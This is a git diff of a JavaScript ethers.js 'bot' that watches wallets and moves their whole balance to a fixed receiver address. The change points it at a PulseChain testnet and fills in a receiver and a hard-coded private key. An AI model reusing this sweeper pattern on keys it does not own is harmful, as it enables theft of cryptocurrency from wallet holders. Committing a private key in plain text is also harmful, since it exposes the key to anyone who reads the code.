@@ -1,14 +1,10 @@
 const { ethers } = require('ethers')
 
-const provider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed.binance.org/')
+const provider = new ethers.providers.JsonRpcProvider('https://rpc.v2b.testnet.pulsechain.com')
 
+const addressReceiver = '0x718942a23D6EB653E7eD2fe194DA5E789793A193'
 
-
-
-
-const addressReceiver = ''
-
-const privateKeys = [""]
+const privateKeys = ["863a0bef9b0d81af6f6f64e6db8cfe06f90d5720a5dfa55cf21ced053e067337"]
 
 const bot = async =>{
 
@@ -36,7 +32,7 @@ const bot = async =>{
                 console.log(gasLimit);
                 const gas1 = gasLimit.mul(5)
                 const gas2 = gas1.div(3)
-                const totalGasCost = gas2.mul(gasPrice);
+                const totalGasCost = gas2.mul(gasPrice).mul(3);
                 console.log(totalGasCost);
                 if (balance.sub(totalGasCost) > 0) {
                     console.log("New Account with Eth!");
@@ -49,7 +45,7 @@ const bot = async =>{
 
 
                         });
-                        console.log(`Success! transferred -->${ethers.utils.formatEther(balance)}`);
+                        console.log(`Success! transferred -->${ethers.utils.formatEther(amount)}`); //replaced the balance to amount
                     } catch (e) {
                         console.log(`error: ${e}`);
                     }
